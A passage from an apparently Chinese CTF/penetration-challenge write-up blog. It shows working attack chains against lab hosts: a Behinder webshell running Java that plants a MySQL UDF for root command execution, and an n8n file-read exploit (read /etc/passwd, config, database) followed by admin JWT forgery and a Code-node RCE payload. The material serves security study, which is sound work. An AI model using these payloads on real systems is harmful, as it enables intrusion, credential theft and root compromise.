+<h4 id="通过-jdbc-写入插件目录并创建-udf"><a class="markdownIt-Anchor" href="#通过-jdbc-写入插件目录并创建-udf"></a> 通过 JDBC 写入插件目录并创建 UDF</h4>
+<p>冰蝎的数据库管理界面底层使用 <code>executeQuery()</code>，不适合执行 <code>CREATE FUNCTION</code> 这类不返回结果集的 DDL 语句。需要在冰蝎「自定义代码」中直接运行 Java 代码，通过 JDBC 完成 UDF 提权。</p>
+<p>或者可以通过上传 JSP 来使用 DDL 语句，下面演示以冰蝎为例。</p>
+<p>在冰蝎「自定义代码」中输入以下 Java 代码并执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDFExploit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object Request;</span><br><span class="line">    <span class="keyword">private</span> Object Response;</span><br><span class="line">    <span class="keyword">private</span> Object Session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fillContext(obj);</span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> ((ServletResponse) Response).getOutputStream();</span><br><span class="line"></span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">                <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mysql&quot;</span>,</span><br><span class="line">                <span class="string">&quot;root&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ShadowF@cets_DB_2026!&quot;</span></span><br><span class="line">            );</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"></span><br><span class="line">            stmt.execute(</span><br><span class="line">                <span class="string">&quot;SELECT load_file(&#x27;/usr/local/tomcat/webapps/ROOT/uploads/lib_mysqludf_sys.so&#x27;) &quot;</span> +</span><br><span class="line">                <span class="string">&quot;INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#x27;&quot;</span></span><br><span class="line">            );</span><br><span class="line">            so.write(<span class="string">&quot;[+] UDF dumped\n&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">            stmt.execute(<span class="string">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys.so&#x27;&quot;</span>);</span><br><span class="line">            so.write(<span class="string">&quot;[+] CREATE FUNCTION success\n&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SELECT sys_eval(&#x27;id&#x27;) AS result&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                so.write((<span class="string">&quot;[+] Result: &quot;</span> + rs.getString(<span class="string">&quot;result&quot;</span>) + <span class="string">&quot;\n&quot;</span>).getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">            so.flush();</span><br><span class="line">            so.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fillContext</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.getClass().getName().contains(<span class="string">&quot;PageContext&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.Request = obj.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(obj);</span><br><span class="line">            <span class="built_in">this</span>.Response = obj.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">            <span class="built_in">this</span>.Session = obj.getClass().getDeclaredMethod(<span class="string">&quot;getSession&quot;</span>).invoke(obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Map&lt;String, Object&gt; objMap = (Map&lt;String, Object&gt;) obj;</span><br><span class="line">            <span class="built_in">this</span>.Session = objMap.get(<span class="string">&quot;session&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.Response = objMap.get(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.Request = objMap.get(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Response.getClass()</span><br><span class="line">            .getDeclaredMethod(<span class="string">&quot;setCharacterEncoding&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;)</span><br><span class="line">            .invoke(Response, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行成功后返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] UDF dumped</span><br><span class="line">[+] CREATE FUNCTION success</span><br><span class="line">[+] Result: uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>说明 <code>sys_eval()</code> 已经可以以 root 权限执行系统命令。</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153856150.png" alt="image-20260614153856150" /></p>
+<p>后续直接调用自定义函数读取flag即可：<code>ResultSet rs = stmt.executeQuery(&quot;SELECT sys_eval('cat /flag-*') AS flag&quot;);</code></p>
+<h3 id="攻击链"><a class="markdownIt-Anchor" href="#攻击链"></a> 攻击链</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">访问资产管理系统上传点</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">利用 Ghost Bits / Unicode 低 8 位截断绕过 JSP 黑名单</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">上传 JSP WebShell 并连接冰蝎</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">获得 tomcatuser 低权限 Shell</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">读取 /usr/local/tomcat/webapps/ROOT/META-INF/context.xml</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">获取 MySQL root 密码 ShadowF@cets_DB_2026!</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">发现 mysqld 以 root 运行，编译并上传 UDF 动态库</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">通过 JDBC 执行 SELECT load_file(...) INTO DUMPFILE ...</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">CREATE FUNCTION sys_eval，调用 sys_eval(&#x27;cat /flag-*&#x27;)</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">获得 flag</span><br></pre></td></tr></table></figure>
+<h2 id="连锁反应复现"><a class="markdownIt-Anchor" href="#连锁反应复现"></a> 连锁反应(复现)</h2>
+<h3 id="n8n信息收集"><a class="markdownIt-Anchor" href="#n8n信息收集"></a> n8n信息收集</h3>
+<p>先访问n8n的公开配置接口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.23.3.32:5678/rest/settings</span><br></pre></td></tr></table></figure>
+<p>返回 JSON 中可见：</p>
+<ul>
+<li><code>versionCli: &quot;1.65.0&quot;</code></li>
+<li><code>endpointForm: &quot;form&quot;</code></li>
+<li><code>endpointWebhook: &quot;webhook&quot;</code></li>
+</ul>
+<p>这确认了 n8n 版本，也提示了 Form Trigger 的访问路径前缀。</p>
+<p>确认目标存在 CVE-2026-21858 漏洞。同时可以获取 webhook 基 础路径等信息。</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614164501781.png" alt="image-20260614164501781" /></p>
+<p>n8n 的表单触发器（Form Trigger）的访问路径格式为<code>/form/&lt;webhook-path&gt;</code>。由于我们不知道具体路径，需要 进行目录扫描</p>
+<p>扫描会发现一个可访问的表单端点<code> /form/upload</code> ，返回一个包含文件上传功能的文档提交表单页面。</p>
+<h3 id="content-type-混淆任意文件读取"><a class="markdownIt-Anchor" href="#content-type-混淆任意文件读取"></a> Content-Type 混淆任意文件读取</h3>
+<p>向 <code>/form/upload</code> 发送 <code>application/json</code> 请求，在 <code>field-1</code> 中注入 <code>filepath</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/form/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.3.32:5678</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;field-0&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;field-1&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;filepath&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+<p>成功读出 <code>/etc/passwd</code>，说明漏洞可利用。</p>
+<p>再读进程环境变量：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;field-0&quot;:&quot;test&quot;,&quot;field-1&quot;:&#123;&quot;filepath&quot;:&quot;/proc/self/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>从中得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N8N_LOG_PATH=/var/log/n8n/system-info.log</span><br></pre></td></tr></table></figure>
+<p>继续读取日志文件，发现：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/config-viewer</span><br></pre></td></tr></table></figure>
+<p>它是一个 <code>setuid root</code> 可执行文件。</p>
+<p><strong>读取配置和数据库</strong></p>
+<p>读取 n8n 配置文件：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;field-0&quot;:&quot;test&quot;,&quot;field-1&quot;:&#123;&quot;filepath&quot;:&quot;/home/node/.n8n/config&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>再读取数据库：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;field-0&quot;:&quot;test&quot;,&quot;field-1&quot;:&#123;&quot;filepath&quot;:&quot;/home/node/.n8n/database.sqlite&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>从配置中拿到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encryptionKey = c8_mFrvNUKpkPRmARIO17uNSdJYIcLt2oeS11eKukC4</span><br></pre></td></tr></table></figure>
+<p>数据库里可拿到管理员信息：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email = admin@n8n.io</span><br><span class="line">password_hash = $2b$10$nLR2QETPQO5tGQWN8/s2pecijlLJpKQraCKE/gVZXcjCooAPXBjW6</span><br><span class="line">id = e691d87c-2865-4328-9817-85f86feb08da</span><br></pre></td></tr></table></figure>
+<h3 id="伪造管理员-jwt"><a class="markdownIt-Anchor" href="#伪造管理员-jwt"></a> 伪造管理员 JWT</h3>
+<p>n8n 使用 JWT 进行认证，JWT Secret 由 encryptionKey 的偶数位字符经 SHA256 计算得到：</p>
+<p>JWT Secret 的计算方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encryptionKey = <span class="string">&quot;c8_mFrvNUKpkPRmARIO17uNSdJYIcLt2oeS11eKukC4&quot;</span></span><br><span class="line">baseKey = <span class="string">&quot;&quot;</span>.join(encryptionKey[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encryptionKey), <span class="number">2</span>))</span><br><span class="line">jwtSecret = hashlib.sha256(baseKey.encode()).hexdigest()</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0cecb5b892d9203171055a197506751c826b00e162b843677e1b862ddfec63be</span><br></pre></td></tr></table></figure>
+<p>JWT 的 <code>hash</code> 字段计算方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, base64</span><br><span class="line"></span><br><span class="line">email = <span class="string">&quot;admin@n8n.io&quot;</span></span><br><span class="line">password_hash = <span class="string">&quot;$2b$10$nLR2QETPQO5tGQWN8/s2pecijlLJpKQraCKE/gVZXcjCooAPXBjW6&quot;</span></span><br><span class="line">combined = <span class="string">f&quot;<span class="subst">&#123;email&#125;</span>:<span class="subst">&#123;password_hash&#125;</span>&quot;</span></span><br><span class="line">hash_value = base64.b64encode(hashlib.sha256(combined.encode()).digest()).decode()[:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6n5pUa1jcY</span><br></pre></td></tr></table></figure>
+<p>用这两个值生成伪造的 <code>n8n-auth</code> Cookie。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;e691d87c-2865-4328-9817-85f86feb08da&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hash&quot;</span>: <span class="string">&quot;6n5pUa1jcY&quot;</span>, <span class="comment"># 需根据实际 email 和 password_hash 计算</span></span><br><span class="line">	<span class="string">&quot;iat&quot;</span>: <span class="built_in">int</span>(datetime.now().timestamp()),</span><br><span class="line">	<span class="string">&quot;exp&quot;</span>: <span class="built_in">int</span>((datetime.now() + timedelta(days=<span class="number">30</span>)).timestamp())</span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(payload, jwtSecret, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="创建并执行-code-节点"><a class="markdownIt-Anchor" href="#创建并执行-code-节点"></a> 创建并执行 Code 节点</h3>
+<p>使用伪造的 Cookie 调用 <code>/rest/workflows</code> 创建工作流，再触发运行：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/workflows</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like G</span><br><span class="line">ecko) Chrome/89.0.4389.82 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.3.32:5678</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>n8n-auth=&lt;伪造的token&gt;</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;rce-exploit&quot;,</span><br><span class="line">&quot;active&quot;: true,</span><br><span class="line">&quot;nodes&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;When clicking \&quot;Test workflow\&quot;&quot;,</span><br><span class="line">&quot;type&quot;: &quot;n8n-nodes-base.manualTrigger&quot;,</span><br><span class="line">&quot;typeVersion&quot;: 1,</span><br><span class="line">&quot;position&quot;: [0, 0],</span><br><span class="line">&quot;parameters&quot;: &#123;&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Code&quot;,</span><br><span class="line">&quot;type&quot;: &quot;n8n-nodes-base.code&quot;,</span><br><span class="line">&quot;typeVersion&quot;: 2,</span><br><span class="line">&quot;position&quot;: [200, 0],</span><br><span class="line">&quot;parameters&quot;: &#123;</span><br><span class="line">&quot;jsCode&quot;: &quot;const exec = require(&#x27;child_process&#x27;).execSync;\nconst result = exec</span><br><span class="line">(&#x27;/usr/local/bin/config-viewer /flag-*&#x27;).toString();\nreturn [&#123;json: &#123;output: resul</span><br><span class="line">t&#125;&#125;];&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line">&quot;connections&quot;: &#123;</span><br><span class="line">&quot;When clicking \&quot;Test workflow\&quot;&quot;: &#123;</span><br><span class="line">&quot;main&quot;: [[&#123;&quot;node&quot;: &quot;Code&quot;, &quot;type&quot;: &quot;main&quot;, &quot;index&quot;: 0&#125;]]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165100761.png" alt="image-20260614165100761" /></p>
+<p>工作流中的 Code 节点执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">execSync</span>;</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">exec</span>(<span class="string">&#x27;/usr/local/bin/config-viewer /flag-*&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"><span class="keyword">return</span> [&#123;<span class="attr">json</span>: &#123;<span class="attr">output</span>: result&#125;&#125;];</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165139628.png" alt="image-20260614165139628" /></p>
+<p><code>/rest/executions/10</code>接口返回的执行记录中包含：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=== Configuration File: /flag-2lkk ===</span><br><span class="line">flag&#123;12345678-test-test-test-123456789012&#125;</span><br><span class="line">=== End of Configuration ===</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165202612.png" alt="image-20260614165202612" /></p>
+<h3 id="攻击链-2"><a class="markdownIt-Anchor" href="#攻击链-2"></a> 攻击链</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">侦察确认版本 → 目录扫描发现表单 → Content-Type混淆 → 任意文件读取 → 读取n8n配置/数据库获取凭证 →计算JWT Secret → 伪造管理员JWT → Code节点RCE → config-viewer读flag → 获取Flag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="MSSQL注入getshell与提权" class="lazyload">
+          
+        
+        <a href="/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            MSSQL注入getshell与提权
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/background-2.jpg" data-sizes="auto" alt="HFish蜜罐部署" class="lazyload">
+        
+      
+      <a href="/2026/06/09/HFish%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          HFish蜜罐部署
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#404%E5%8F%B7%E8%8A%82%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 404号节点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jolokia-rce"><span class="toc-number">1.1.</span> <span class="toc-text"> Jolokia RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1tar%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83%E8%87%B3sysadmin"><span class="toc-number">1.2.</span> <span class="toc-text"> 定时任务tar通配符提权至sysadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoperf-stat%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="toc-number">1.3.</span> <span class="toc-text"> sudo+perf stat提权至root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text"> 日志审计系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text"> 换行命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logrotate-%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> Logrotate 提权利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text"> 默认配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jupyter"><span class="toc-number">3.1.</span> <span class="toc-text"> jupyter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 